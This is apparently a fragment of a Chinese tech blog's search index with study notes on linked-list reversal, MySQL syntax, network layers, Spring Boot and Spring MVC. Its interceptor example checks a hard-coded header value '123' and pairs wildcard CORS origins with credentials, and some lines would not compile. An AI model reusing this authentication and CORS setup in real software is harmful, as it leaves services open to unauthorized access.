  <span class="token key atrule">add-host-header</span><span class="token punctuation">:</span> <span class="token boolean important">true</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> springcloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法常规解答</title>
      <link href="/2021/12/15/suan-fa-chang-gui-jie-da/"/>
      <url>/2021/12/15/suan-fa-chang-gui-jie-da/</url>
      
        <content type="html"><![CDATA[<h2 id="一、迭代法"><a href="#一、迭代法" class="headerlink" title="一、迭代法"></a>一、迭代法</h2><p>1.对于一个单一连续性方向的链表翻转，可以使用交踢迭代的方法解决（力扣剑指office|| 024），哪边为null哪边就为尾部：</p><pre><code>1.逐步缩减计算范围ListNode next = curr.next;2.尾部首先设置为空，其次将每个链表通过尾插法赋值while (curr != null) {            ListNode next = curr.next;            curr.next = prev;            prev = curr;            curr = next;        }</code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql基础语法</title>
      <link href="/2021/12/11/mysql-ji-chu-yu-fa/"/>
      <url>/2021/12/11/mysql-ji-chu-yu-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="一、where子句常用查询条件"><a href="#一、where子句常用查询条件" class="headerlink" title="一、where子句常用查询条件"></a>一、where子句常用查询条件</h2><table><thead><tr><th align="center">谓词</th><th align="center">查询条件</th></tr></thead><tbody><tr><td align="center">确定范围</td><td align="center">between and, not between and</td></tr><tr><td align="center">确定集合</td><td align="center">in, not in</td></tr><tr><td align="center">字符匹配</td><td align="center">like, not like</td></tr><tr><td align="center">空值</td><td align="center">is null, is not null</td></tr></tbody></table><h2 id="二、like关键字说明"><a href="#二、like关键字说明" class="headerlink" title="二、like关键字说明"></a>二、like关键字说明</h2><pre><code>1.like ‘刘%’  ：查询所有姓刘学生的信息；2.like &#39;欧阳_&#39; : 查询姓为欧阳三个汉字的学生信息；3.like &#39;_阳%&#39; : 查询第二个字为阳的所有学生信息；4.like &#39;DB\_abc&#39; escape&#39;\&#39; :查询DB_abc的信息，&#39;\&#39;为换码字符（转义）5.like &#39;DB\_%i__&#39; escape&#39;\&#39; : 查询以“DB_”开头，且倒数第三个字符为i的信息；</code></pre><h2 id="三、order-by-排序（跟where使用）"><a href="#三、order-by-排序（跟where使用）" class="headerlink" title="三、order by 排序（跟where使用）"></a>三、order by 排序（跟where使用）</h2><pre><code>1.order by ‘xx属性’ asc : 升序；2.order by ‘xx属性’ desc : 降序；例：where xx = &quot;xx&quot; order by ‘xx属性’ asc ;</code></pre><h2 id="四、聚集函数"><a href="#四、聚集函数" class="headerlink" title="四、聚集函数"></a>四、聚集函数</h2><table><thead><tr><th align="center">count( [distinct|all] &lt;列名&gt;)</th><th align="center">统计列个数</th></tr></thead><tbody><tr><td align="center">sum( [distinctall] &lt;列名&gt;)</td><td align="center">计算总额</td></tr><tr><td align="center">avg( [distinctall] &lt;列名&gt;)</td><td align="center">计算平均值</td></tr><tr><td align="center">max( [distinctall] &lt;列名&gt;)</td><td align="center">最大值</td></tr><tr><td align="center">min( [distinctall] &lt;列名&gt;)</td><td align="center">最小值</td></tr></tbody></table><p>distinct：过滤重复项</p><p>all：查询所有值</p><p>聚集函数只能用于select语句和group by 中的having子句，where表达式不允许使用</p><h2 id="五、group-by-子句"><a href="#五、group-by-子句" class="headerlink" title="五、group by 子句"></a>五、group by 子句</h2><pre><code>例：where xx = &quot;xx&quot; group by Sno having count(*)&gt;3;</code></pre><p>根据条件进行分组，并判断分组中Sno是否超过3；</p><h2 id="六、连接查询"><a href="#六、连接查询" class="headerlink" title="六、连接查询"></a>六、连接查询</h2><p>1、等值连接和非等值连接：通过“=”连接起来，对于null的数据项忽略；</p><p>2、自身连接：同一个数据表定义不同别名，并通过条件连接起来；</p><p>3、外连接（对于null的数据项不忽略）：</p><p>​            左连接（left join)：以左边的表为基准连接右边的表;</p><p>​            右连接（right join): 以右边的表为基准连接左边的表；</p><pre><code>例：from A join B on a.no=b.no //连接    from A left join B on a.no=b.no     from A right join B using(no)//去除no重复值</code></pre><p>4、多表连接：</p><p>​    where A.no = B.no and C.co = B.co;</p><p>5、嵌套查询：</p><p>​    where no in(select no from xxx) //子查询语句不能使用order by </p><h2 id="七、集合查询"><a href="#七、集合查询" class="headerlink" title="七、集合查询"></a>七、集合查询</h2><p>主要包括并操作union、交操作intersect和差操作except;</p><pre><code>例：查询语句1 union 查询语句2</code></pre><h2 id="八、带exists的谓词子查询"><a href="#八、带exists的谓词子查询" class="headerlink" title="八、带exists的谓词子查询"></a>八、带exists的谓词子查询</h2><p>带exists的谓词子查询不返回任何数据，只产生逻辑“true”或”false“。</p><pre><code>例：Student where exists (select * from SC where no = Student.no and cno =&#39;1&#39;)</code></pre><h2 id="九、其他"><a href="#九、其他" class="headerlink" title="九、其他"></a>九、其他</h2><p>1、常见按条件查询所有数据可以是按表间连接中某一字段等于进行查询。</p><p>2、having有且的意思。</p><p>3、解题技巧：</p><p>​        增加表减轻复杂度：可以重新定义表然后重命名，根据表中内容进行条件判断；</p><p>4、over函数可以直接跟在select属性后面，over函数里可以加order by进行排序，对于计算多个id的值需要进行排序计算。（比如ID，日期的加减，需要用到over对ID进行排序后才能进行计算）</p><p>5、row_number()：获取当前行数（从1开始）。</p><p>6、count(1) and count(字段)：<br>     两者的主要区别是<br> （1） count(1) 会统计表中的所有的记录数，包含字段为null 的记录。<br> （2） count(字段) 会统计该字段在表中出现的次数，忽略字段为null 的情况。即不统计字段为null 的记录。</p><p>7、循序递增的id-循序递增是值 = 固定值</p><p>​    例：2-1=1,3-2=1。</p><p>8、IFNULL() 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。</p><p>IFNULL() 函数语法格式为：</p><pre><code>IFNULL(expression, alt_value)</code></pre><p>9、LIMIT与OFFSET的使用</p><p>limit 与 offset：从下标0开始</p><p>   offset X  是跳过X个数据</p><p>   limit Y   是选取Y个数据</p><p>   limit  X,Y 中X表示跳过X个数据，读取Y个数据</p><pre><code>from table limit 2,1;//跳过2条取出1条数据，limit后面是从第2条开始读，读取1条信息，即读取第3条数据from table limit 2 offset 1;//从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条</code></pre><p>10、SET N := N-1; “:=”表示覆盖之前的值</p><p>11、mysql中where后为什么不能使用select中定义的别名：</p><pre><code>因为mysql中sql语句的书写顺序与执行顺序不同        sql书写顺序：select 查询内容 from 表 where 查询条件        sql执行顺序: from 表 where 查询条件 select 查询内容</code></pre><p>12、limit 不支持子查询</p><pre><code>错：select * from my_table where id in (select id from my_table limit 10)解决方案：select * from my_table where id in (select t.id from (select * from my_table limit 10)as t) </code></pre>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法</title>
      <link href="/2021/11/20/suan-fa-ti/"/>
      <url>/2021/11/20/suan-fa-ti/</url>
      
        <content type="html"><![CDATA[<p>一、397整数替换</p><p>当 n为偶数时，我们只有唯一的方法将 n 替换为 n/2；</p><p>当 n 为奇数时，n除以 4 的余数要么为 1，要么为 3。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/2021/05/19/ji-suan-ji-wang-luo/"/>
      <url>/2021/05/19/ji-suan-ji-wang-luo/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网络层次划分"><a href="#一、网络层次划分" class="headerlink" title="一、网络层次划分"></a>一、网络层次划分</h2><p>第一种模型是OSI七层模型，OSI为（Open System interconnect）的缩写，自上而下分别是<strong>应用层、表示层、会话层、传输层、<a href="https://so.csdn.net/so/search?q=网络层&spm=1001.2101.3001.7020" target="_blank" rel="noopener">网络层</a>、数据链路层、物理层</strong></p><p>物理层：网卡，网线，集线器，中继器，调制解调器</p><p>数据链路层：网桥，交换机</p><p>网络层：路由器</p><p><img src="assets/image-20220119103511754.png" alt="image-20220119103511754"></p><p><strong>数据链路层协议：PPP ARP MAC IEEE802.3</strong><br> <strong>网络层协议：IP BGMP</strong><br> <strong>传输层协议：TCP UDP</strong><br> <strong>应用层协议：HTTP HTTPS FTP Telnet SMTP</strong></p><p>五层协议的体系结构知识为了介绍网络原理而设计的,实际应用还是采用TCP/IP四层体系结构。</p><p><img src="assets/image-20220119104203951.png" alt="image-20220119104203951"></p><h2 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h2><p>链接：<a href="https://www.nowcoder.com/questionTerminal/a348b0c0d06844a888b2e946e80e946b" target="_blank" rel="noopener">https://www.nowcoder.com/questionTerminal/a348b0c0d06844a888b2e946e80e946b</a><br>来源：牛客网</p><p><strong><em>1.Linux下哪个命令可以用于判断host1主机是否能够访问host2主机的端口？</em></strong></p><p>ping是使用的ICMP协议，是IP层协议，但是端口是应用层的，所以它只能判断能够访问ip，不能判断端口 </p><p>ifconfig是查看本机的网络设置，IP，子网掩码等 </p><p><strong>telnet是应用层的，可以判端口访问情况</strong> </p><p> netstat显示网络信息，如网络连接，路由表，接口状态</p><p><img src="assets/image-20220119105943270.png" alt="image-20220119105943270"></p><p><strong>2.以下选项属于进程间通信的是（ABD）</strong></p><p><strong>A.管道</strong><br> <strong>B.套接字</strong><br> C.内存<br> <strong>D.消息队列</strong></p><p>解析：进程中的几种通信方式：<br>1）<strong>管道</strong>：管道是一种半双工的通信方式，数据只能单向流动。而且只能在具有血缘关系（父子进程之间）的进程间使用。<br>2）<strong>信号量</strong>：信号量是一个计数器，可以用来控制多个进程对共享资源的访问<br>3）<strong>消息队列</strong>：消息队列是由消息组成的链表，存放在内核中，并由消息队列标识符标识<br>4）<strong>信号</strong>：信号是有一种比较复杂的通信方式，用于通知接收进程某一事件已经发生<br>5）<strong>共享内存</strong>：共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问<br>6）<strong>套接字</strong>：即Socket，是一种通信机制，凭借这种机制，客户/服务器系统的开发工作既可以在本地单机上进行，也可以跨网络进行</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springboot</title>
      <link href="/2021/03/22/springboot/"/>
      <url>/2021/03/22/springboot/</url>
      
        <content type="html"><![CDATA[<h3 id="一、springboot介绍"><a href="#一、springboot介绍" class="headerlink" title="一、springboot介绍"></a>一、springboot介绍</h3><h4 id="1-什么是springboot"><a href="#1-什么是springboot" class="headerlink" title="1.什么是springboot"></a>1.什么是springboot</h4><p>Spring是一个开源框架，Spring是于2003 年兴起的一个轻量级的Java 开发框架，由Rod Johnson 在其著作《Expert One-On-One J2EE Development and Design》。Spring是为了解决企业级应用开发的复杂性而创建的，使用Spring可以让简单的JavaBean实现之前只有EJB才能完成的事情。但是Spring不仅仅局限于服务器端开发，任何Java应用都能在简单性、可测试性和松耦合性等方面从Spring中获益。<strong>springboot对于包管理严格，约定大于配置</strong></p><h4 id="2-springboot如何简化开发"><a href="#2-springboot如何简化开发" class="headerlink" title="2.springboot如何简化开发"></a>2.springboot如何简化开发</h4><p>为了降低Java开发的复杂性，Spring采用了以下4种关键策略：</p><p>1、基于POJO的轻量级和最小侵入性编程；</p><p>2、通过依赖注入（DI）和面向接口实现松耦合；</p><p>3、基于切面（AOP）和惯例进行声明式编程；</p><p>4、通过切面和模版减少样式代码；</p><h4 id="3-springboot四大特性"><a href="#3-springboot四大特性" class="headerlink" title="3.springboot四大特性"></a>3.springboot四大特性</h4><p>1、<strong>SpringBoot Starter</strong>：他将常用的依赖分组进行了整合，将其合并到一个依赖中，这样就可以一次性添加到项目的Maven或Gradle构建中；</p><p>2、<strong>自动配置</strong>：SpringBoot的自动配置特性利用了Spring4对条件化配置的支持，合理地推测应用所需的bean并自动化配置他们；</p><p>3、<strong>命令行接口</strong>：（Command-line-interface, CLI）：SpringBoot的CLI发挥了Groovy编程语言的优势，并结合自动配置进一步简化Spring应用的开发；</p><p>4、<strong>Actuatir</strong>：它为SpringBoot应用的所有特性构建一个小型的应用程序。但首先，我们快速了解每项特性，更好的体验他们如何简化Spring编程模型。</p><h3 id="二、springboot一些常用注解"><a href="#二、springboot一些常用注解" class="headerlink" title="二、springboot一些常用注解"></a>二、springboot一些常用注解</h3><pre><code>@Configuration//注解配置类，扩展配置，视图解析器等 @Bean(name = &quot;druidSource&quot;)//定义bean的名字   @ConfigurationProperties(&quot;spring.datasource一一对应&quot;)//将配置文件中的每一个属性的值，映射到这个组件中，将配置文件下的所有spring.datasource一一对应@PropertySource(value = &quot;classpath:spring.datasource&quot;)实体属性要与value绑定</code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web拦截器</title>
      <link href="/2020/10/16/web-lan-jie-qi/"/>
      <url>/2020/10/16/web-lan-jie-qi/</url>
      
        <content type="html"><![CDATA[<h2 id="springboot请求拦截器"><a href="#springboot请求拦截器" class="headerlink" title="springboot请求拦截器"></a>springboot请求拦截器</h2><pre><code>WebMvcConfigurer：拦截器的注册类HandlerInterceptorAdapter：拦截组件</code></pre><p>拦截组件HandlerInterceptorAdapter可以有多个，需要注册到WebMvcConfigurer里面，在WebMvcConfigurer里面拦截器是按顺序执行的。</p><p>一、实现HandlerInterceptor接口中的preHandle方法（返回false表示拦截，true放行，在请求前拦截）</p><pre><code>public class AuthInterceptor implements HandlerInterceptor {    /**     * 通过配置是否认证，对开发环境免除校验，方便开发     */    @Value(&quot;${is.auth}&quot;)    private boolean isAuth;    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {    //添加条件判断        if(handler instanceof HandlerMethod){            //可以从handler 获取中获得方法           // Method method = ((HandlerMethod) handler).getMethod();            if(isAuth){                ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();                HttpServletRequest request1 = requestAttributes.getRequest();                String sign = request1.getHeader(&quot;sign&quot;);                System.out.println(&quot;从HttpServletRequest直接获取&quot;+sign);                String sign1 = request1.getHeader(&quot;sign&quot;);                System.out.println(&quot;从RequestContextHolder中获取的&quot;+sign1);                if (&quot;123&quot;.equals(sign1)) {                    System.out.println(&quot;校验通过&quot;);                    return true;                }                System.out.println(&quot;校验不通过&quot;);                return false;            }        }        return true;    }    @Override    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {    }    @Override    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {    }}</code></pre><h2 id="WebMvcConfigurer拦截器注册类"><a href="#WebMvcConfigurer拦截器注册类" class="headerlink" title="WebMvcConfigurer拦截器注册类"></a>WebMvcConfigurer拦截器注册类</h2><p>1、配置拦截器（这个里面添加了跨域支持，当集成<a href="https://so.csdn.net/so/search?q=swagger&spm=1001.2101.3001.7020" target="_blank" rel="noopener">swagger</a>防止后台报错），如果没有必要删除其配置，这里做一下展示。</p><pre><code>@Configuration//加载当前的拦截器进行注册public class AdminCommonConfig implements WebMvcConfigurer {    /**     * 跨域支持     * @param registry     */    @Override    public void addCorsMappings(CorsRegistry registry) {        registry.addMapping(&quot;/**&quot;)                .allowedOrigins(&quot;*&quot;)                .allowCredentials(true)                .allowedMethods(&quot;GET&quot;, &quot;POST&quot;, &quot;DELETE&quot;, &quot;PUT&quot;)                .maxAge(3600 * 24);    }    /**     * 自定义拦截器地址     * @return     */    @Bean    public HandlerInterceptor authInterceptor(){        return new AuthInterceptor();    }    /**     * 添加拦截路径     * @param registry     */    @Override    public void addInterceptors(InterceptorRegistry registry) {        //拦截的url地址        String url = &quot;/**&quot;;        //添加排除排除URL校验路径        List&lt;String&gt; patterns = new ArrayList&lt;&gt;();        patterns.add(&quot;/css/**&quot;)        patterns.add(&quot;/web/login.html&quot;)        registry.addInterceptor(authInterceptor()).addPathPatterns(url).excludePathPatterns(patterns);    }    /**     * 当集成swagger防止后台报错     * No mapping found for HTTP request with URI [/swagger-resources/configuration/ui] in DispatcherServlet with name &#39;dispatcherServlet&#39;     * @param registry     */    @Override    public void addResourceHandlers(ResourceHandlerRegistry registry) {        //过滤swagger        registry.addResourceHandler(&quot;swagger-ui.html&quot;)                .addResourceLocations(&quot;classpath:/META-INF/resources/&quot;);        registry.addResourceHandler(&quot;/webjars/**&quot;)                .addResourceLocations(&quot;classpath:/META-INF/resources/webjars/&quot;);    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringMvc</title>
      <link href="/2020/09/15/springmvc/"/>
      <url>/2020/09/15/springmvc/</url>
      
        <content type="html"><![CDATA[<h3 id="一、SpringMvc组成"><a href="#一、SpringMvc组成" class="headerlink" title="一、SpringMvc组成"></a>一、SpringMvc组成</h3><p>Spring的MVC框架主要由DispatcherServlet（前端控制器，如果配置“?”不包含jsp结尾的格式）、处理器映射、处理器(控制器)、视图解析器、视图组成。</p><p><a href="https://www.cnblogs.com/fengquan-blog/p/11161084.html" target="_blank" rel="noopener">https://www.cnblogs.com/fengquan-blog/p/11161084.html</a></p><h3 id="二、SpringMvc运行原理"><a href="#二、SpringMvc运行原理" class="headerlink" title="二、SpringMvc运行原理"></a>二、SpringMvc运行原理</h3><p>1、 用户发送请求至前端控制器DispatcherServlet。</p><p>2、 DispatcherServlet收到请求调用HandlerMapping处理器映射器。</p><p>3、 处理器映射器找到具体的处理器(可以根据xml配置、注解进行查找)，生成处理器对象及处理器拦截器(如果有则生成)一并返回给DispatcherServlet。</p><p>4、 DispatcherServlet调用HandlerAdapter处理器适配器。</p><p>5、 HandlerAdapter经过适配调用具体的处理器(Controller，也叫后端控制器)。</p><p>6、 Controller执行完成返回ModelAndView。</p><p>7、 HandlerAdapter将controller执行结果ModelAndView返回给DispatcherServlet。</p><p>8、 DispatcherServlet将ModelAndView传给ViewReslover视图解析器。</p><p>9、 ViewReslover解析后返回具体View。</p><p>10、DispatcherServlet根据View进行渲染视图（即将模型数据填充至视图中）。</p><p>11、 DispatcherServlet响应用户。</p><h3 id="三、组件说明："><a href="#三、组件说明：" class="headerlink" title="三、组件说明："></a>三、组件说明：</h3><p>以下组件通常使用框架提供实现：</p><p><strong>DispatcherServlet</strong>：作为前端控制器，整个流程控制的中心，控制其它组件执行，统一调度，降低组件之间的耦合性，提高每个组件的扩展性。</p><p><strong>HandlerMapping</strong>：通过扩展处理器映射器实现不同的映射方式，例如：配置文件方式，实现接口方式，注解方式等。 </p><p><strong>HandlerAdapter</strong>：通过扩展处理器适配器，支持更多类型的处理器。</p><p><strong>ViewResolver</strong>：通过扩展视图解析器，支持更多类型的视图解析，例如：jsp、freemarker、pdf、excel等。</p><h3 id="四、注解和xml配置两种方式配置springmvc"><a href="#四、注解和xml配置两种方式配置springmvc" class="headerlink" title="四、注解和xml配置两种方式配置springmvc"></a>四、注解和xml配置两种方式配置springmvc</h3><p>web.xml</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>    <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee    http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd<span class="token punctuation">"</span></span>    <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3.1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>spring-11-mvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- SpringMVC前端控制器 1.前端接收所有请求， 2.启动SpringMVC工厂 mvc.xml 3.springMVC流程调度 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 注册DispatcherServlet 这个是springMVC的核心；请求分发器，前端控制器 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>springmvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.springframework.web.servlet.DispatcherServlet        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 关联一个springmvc配置文件：【servlet-name】 -servlet.xml --></span>        <span class="token comment" spellcheck="true">&lt;!-- DispatcherServlet要绑定spring的配置文件 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>classpath:springmvc-servletdemo.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- classpath:当前路径下找，classpath*:所有包下找 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 启动级别 1 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- / 匹配所有请求：不包括 .jsp --></span>    <span class="token comment" spellcheck="true">&lt;!-- /* 匹配所有的请求 包括.jsp --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>springmvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span></code></pre><h4 id="1-通过xml配置"><a href="#1-通过xml配置" class="headerlink" title="1.通过xml配置"></a>1.通过xml配置</h4><p>springmvc.xml</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 添加处理器映射器 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>        <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 添加处理器适配器 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>        <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 添加视图解析器 --></span>        <span class="token comment" spellcheck="true">&lt;!-- 视图解析器：DispatcherServlet给它的ModelAndView    1.获得了ModelAndView 的数据    2.解析ModelAndView的视图名字    3.拼接视图名字，找到对应的视图：  /WEB-INF/jsp/hello.jsp    4.将数据渲染到视图上。     --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>        <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.InternalResourceViewResolver<span class="token punctuation">"</span></span>        <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>InternalResourceViewResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prefix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>suffix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>.jsp<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- Handler 每一个Controller都要注册一个bean--></span>        &lt;bean id = "/hello" class="com.kuang.controller.HelloController"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>1.使用（org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping）处理映射器</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>        <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        //将bean的name作为URL进行查找，需要再配置Handler时指定beanname(就是URL)&lt;bean id = "/hello" class="com.kuang.controller.HelloController"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><p>2.使用（org.springframework.web.servlet.handler.SimpleUrlHandlerMapping）处理映射器</p><pre class=" language-xml"><code class="language-xml">&lt;bean id = "hello" class="com.kuang.controller.HelloController"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>  <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.handler.SimpleUrlHandlerMapping<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>urlMap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span 